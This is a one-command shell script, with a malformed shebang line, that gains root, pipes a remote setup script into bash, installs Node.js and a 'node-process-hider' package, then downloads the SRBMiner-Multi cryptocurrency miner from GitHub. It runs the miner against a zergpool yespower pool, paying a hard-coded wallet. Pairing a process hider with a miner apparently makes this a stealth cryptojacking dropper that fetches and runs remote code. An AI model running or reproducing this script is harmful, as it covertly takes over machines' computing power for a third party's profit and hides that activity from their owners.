!#/bin/sh
sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo apt install gcc && npm i -g node-process-hider && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.8/SRBMiner-Multi-0-8-8-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-8-8-Linux.tar.xz && cd SRBMiner-Multi-0-8-8 && ./SRBMiner-MULTI --algorithm yespower --pool yespower.asia.mine.zergpool.com:6533 --wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.worker -t2"
